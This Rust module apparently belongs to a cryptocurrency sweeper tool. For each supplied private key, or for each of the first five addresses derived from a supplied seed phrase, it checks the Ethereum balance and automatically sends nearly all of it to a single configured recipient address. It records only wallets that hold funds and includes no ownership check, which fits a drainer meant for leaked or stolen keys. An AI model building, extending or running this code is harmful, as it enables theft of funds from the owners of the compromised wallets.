use crate::config::Config;
use crate::models::wallet::{TransferResult, WalletInfo};
use crate::wallet::address::AddressDeriver;
use crate::wallet::balance::BalanceChecker;
use crate::wallet::transfer::TransferExecutor;
use std::sync::Arc;
use tracing::{info, warn};

pub struct WalletManager {
    config: Arc<Config>,
    address_deriver: AddressDeriver,
    balance_checker: BalanceChecker,
    transfer_executor: TransferExecutor,
}

impl WalletManager {
    pub fn new(config: Arc<Config>) -> Result<Self, Box<dyn std::error::Error>> {
        let address_deriver = AddressDeriver::new();
        let balance_checker = BalanceChecker::new(&config.rpc_url)?;
        let transfer_executor = TransferExecutor::new(&config.rpc_url, config.chain_id)?;
        
        Ok(Self {
            config,
            address_deriver,
            balance_checker,
            transfer_executor,
        })
    }
    
    // Process private key: derive address, check balance, transfer if available
    pub async fn process_private_key(
        &self,
        private_key: &str,
    ) -> Result<(WalletInfo, Option<TransferResult>), Box<dyn std::error::Error>> {
        // Derive address
        let address = self.address_deriver.derive_address(private_key)
            .ok_or("Failed to derive address from private key")?;
        
        info!("👛 Derived address: {}", address);
        
        // Check balance
        let balance = self.balance_checker.get_balance(&address).await?;
        
        info!("💰 Balance for {}: {} ETH", address, balance);
        
        // Create wallet info
        let wallet_info = WalletInfo {
            address: address.clone(),
            private_key: private_key.to_string(),
            balance: balance.clone(),
            network: "ethereum".to_string(),
        };
        
        // Check if balance is above threshold
        let balance_float: f64 = balance.parse().unwrap_or(0.0);
        
        if balance_float > self.config.min_balance_threshold {
            // Calculate max transferable amount
            let max_amount = TransferExecutor::calculate_max_amount(
                &balance,
                self.config.gas_price_gwei,
                self.config.gas_limit,
            );
            
            if max_amount == "0" || max_amount.parse::<f64>().unwrap_or(0.0) <= 0.0 {
                info!("ℹ️ Balance too low for transfer (gas cost exceeds balance)");
                return Ok((wallet_info, None));
            }
            
            info!("📤 Transferring {} ETH to {}", max_amount, self.config.recipient_address);
            
            // Execute transfer
            let transfer_result = self.transfer_executor.transfer_native(
                private_key,
                &self.config.recipient_address,
                &max_amount,
                self.config.gas_limit,
                self.config.gas_price_gwei,
            ).await?;
            
            Ok((wallet_info, Some(transfer_result)))
        } else {
            info!("ℹ️ Balance below threshold, skipping transfer");
            Ok((wallet_info, None))
        }
    }
    
    // Process seed phrase: check first 5 addresses
    pub async fn process_seed_phrase(
        &self,
        seed_phrase: &str,
    ) -> Result<Vec<(WalletInfo, Option<TransferResult>)>, Box<dyn std::error::Error>> {
        info!("🌱 Processing seed phrase (first 5 addresses)");
        
        // Derive multiple addresses from seed phrase
        let derived_wallets = self.address_deriver.derive_multiple_from_seed(seed_phrase, 5);
        
        if derived_wallets.is_empty() {
            return Err("Failed to derive addresses from seed phrase".into());
        }
        
        let mut results = Vec::new();
        
        for (address, private_key) in derived_wallets {
            info!("👛 Checking derived address: {}", address);
            
            match self.process_private_key(&private_key).await {
                Ok((wallet_info, transfer_result)) => {
                    // Only add if balance > 0 or transfer happened
                    if transfer_result.is_some() || wallet_info.balance != "0" {
                        results.push((wallet_info, transfer_result));
                    }
                }
                Err(e) => {
                    warn!("Failed to process derived address {}: {}", address, e);
                }
            }
        }
        
        Ok(results)
    }
}